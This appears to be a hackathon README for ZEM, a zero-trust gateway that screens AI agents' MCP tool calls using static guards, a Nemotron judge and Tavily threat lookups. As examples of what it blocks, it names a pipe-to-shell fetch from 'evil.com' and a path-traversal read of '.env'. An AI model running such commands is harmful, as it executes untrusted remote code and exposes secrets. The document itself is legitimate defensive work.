# ZEM: Zero-Trust Enforcement for Model Context Protocol (MCP)

> **Inline zero-trust security gateway, deterministic AST guardrails, NVIDIA Nemotron AI reasoning on Nebius Token Factory, and Tavily live threat intelligence for AI agents.**  
> *Built for the NVIDIA · Nebius · Tavily AI Hackathon.*

---

## 🛡️ Overview

**ZEM** sits inline between autonomous AI agents (Claude Code, Cursor, custom MCP hosts) and Model Context Protocol (MCP) tool servers (`zem wrap -- <server_cmd>`). Every `tools/call` JSON-RPC frame is intercepted at the stdio boundary and evaluated through a **3-tier defense-in-depth pipeline** before a single byte touches the operating system:

1. **Tier 1 — Deterministic Fast Guards (`<4ms`, ~80% of traffic, 0 tokens)**:
   - **8 Static Enforcers**: `PathGuard`, `ShellGuard` (`bashlex` AST), `SecretGuard`, `NetGuard`, `UnicodeGuard`, `ToolGuard`, `InstallGuard`, and `OutboundGuard`.
   - Hard-deny violations (`../../.env`, `curl evil.com/x.sh | sh`, secret leakage) are dropped immediately in microseconds.
   - Safe routine calls (`git status`, reading workspace files) pass in `<4ms` without invoking any LLM.
2. **Tier 2 — Nebius Token Factory · NVIDIA Nemotron AI Judge (`~380ms`, Gray-Zone Triage)**:
   - Ambiguous calls (`0.25 <= risk < 0.85` via noisy-OR signal scoring) are routed to **`nvidia/Nemotron-3_5-Lightning`** (fast inline triage) or **`nvidia/nemotron-3-super-120b-a12b`** (deep audit) on **Nebius Token Factory**.
   - **Prompt-Injection Armor**: All tool arguments, signals, and web snippets are angle-bracket neutralized and sealed inside `<untrusted>` XML blocks.
   - **Zero-Waste JSON Mode**: Disables verbose Chain-of-Thought (`enable_thinking: false`), cutting latency by **6.8x** and token usage by **92%** while failing closed on any parse or network error.
3. **Tier 3 — Tavily Live Threat Intelligence (`TavilyEnricher` + SQLite Cache)**:
   - When Nemotron flags an unfamiliar package or domain (`needs_intel: true`), ZEM scrubs the query via `sanitize_query()` (stripping secrets, emails, and local paths) and queries **Tavily Search API** (backed by a `<1ms` local SQLite TTL cache) for live CVEs, OSV/Snyk malware reports, and typosquat advisories.

---

## 🏗️ System Architecture

```mermaid
flowchart TD
    A["AI Agent (Claude / Cursor / MCP Host)"] <-->|MCP JSON-RPC over stdio| B["ZEM Proxy (zem wrap)"]

    subgraph Pipeline ["ZEM 3-Tier Defense Pipeline"]
        B --> C["1. Deterministic Guards (8 Detectors, <4ms)"]
        C --> D{"Noisy-OR Risk Router"}
        D -->|Risk < 0.25| E["ALLOW (<4ms, 0 Tokens)"]
        D -->|hard_deny or Risk >= 0.85| F["DENY (<4ms, 0 Tokens)"]
        D -->|0.25 <= Risk < 0.85 (Gray Zone)| G["2. Nebius AI Judge (Nemotron-3.5-Lightning)"]
        G <-->|needs_intel: true| H["3. Tavily Threat Intel + SQLite Cache"]
        G --> I["Final Policy Enforcement (Fail-Closed)"]
    end

    E & F & I --> J[("SQLite Audit Store (~/.zem/zem.db)")]

    subgraph SOC ["Full-Bleed Real-Time SOC Cockpit"]
        J --> K["FastAPI + SSE Stream (/api/decisions, /api/stream)"]
        K --> L["React 19 + Tailwind Widescreen SOC Console (http://localhost:3000)"]
    end
```

---

## 🚀 Quickstart

### Prerequisites
- Python 3.12+ with [`uv`](https://github.com/astral-sh/uv)
- Node.js 18+ and `npm`
- Optional `.env` keys for live cloud calls (offline cassette replay & mock modes work out-of-the-box with zero keys):
  ```ini
  NEBIUS_API_KEY=your_nebius_token_factory_key
  TAVILY_API_KEY=your_tavily_api_key
  ```

### 1. Install & Verify Backend
```bash
uv sync
uv run ruff check .
uv run mypy src
uv run pytest -q
```

### 2. Start the Live FastAPI Telemetry Server & React SOC Cockpit
```bash
# Terminal 1: Start FastAPI + SSE stream on port 8000
uv run uvicorn zem.api.app:app --host 127.0.0.1 --port 8000 --reload

# Terminal 2: Start Vite SOC Dashboard on port 3000
cd web
npm install
npm run dev
```
Open **`http://localhost:3000`** to explore the full-width SOC Cockpit:
- **Top Strip**: Real-time KPI cards, 2D/3D Wazuh-style Threat Distribution & Latency Prisms, and the **Powered by Nebius Token Factory · NVIDIA Nemotron** telemetry banner.
- **Left Split Console**: Live Intercept Feed table + **1-Click Attack Simulation Workbench** (`Path Traversal (.env)`, `Pipe to Bash`, `Typosquat (Nebius)`, `Safe File Read`).
- **Right Split Console**: **Deep Forensic Inspector** showing static detector signals, the **Nemotron AI Judge** verdict & Latency Waterfall, and the **Tavily Web Radar** threat advisory dossier.

### 3. Wrap Any MCP Server via CLI
```bash
# Wrap a local MCP server with deterministic guards + Nebius Nemotron AI Judge
uv run zem wrap --policy coding-agent --reasoner nebius -- python demo/servers/shell_server.py

# Inspect audit log and model offload statistics
uv run zem log -n 20
uv run zem stats
```

---

## 📦 Round-by-Round Deliverables Matrix

| Round | Component | Key Files |
| :--- | :--- | :--- |
| **R1** | **MCP Stdio Proxy, Core Static Guards, SQLite Audit, FastAPI + SSE, SOC UI** | `src/zem/protocol/stdio_proxy.py`, `src/zem/detectors/`, `src/zem/api/app.py`, `web/src/App.tsx` |
| **R2** | **Nebius Token Factory (`Nemotron-3.5-Lightning` & `Super-120B`), `<untrusted>` Prompt Sandboxing, Offline Cassette, Noisy-OR Gray-Zone Router** | `src/zem/reasoning/nebius_reasoner.py`, `src/zem/reasoning/prompts.py`, `src/zem/pipeline/judge_stage.py`, `config/models.yaml`, [`docs/feedback-nebius-nvidia.md`](docs/feedback-nebius-nvidia.md) |
| **R3** | **Tavily Threat Intelligence (`TavilyEnricher`), Outbound Query Sanitizer, SQLite TTL Cache, Offline Intel Cassette, SOC Intel Dossier UI** | `src/zem/intel/tavily_enricher.py`, `src/zem/intel/cache.py`, `src/zem/intel/record_replay.py`, `tests/unit/test_tavily_intel.py`, [`docs/feedback-tavily.md`](docs/feedback-tavily.md) |
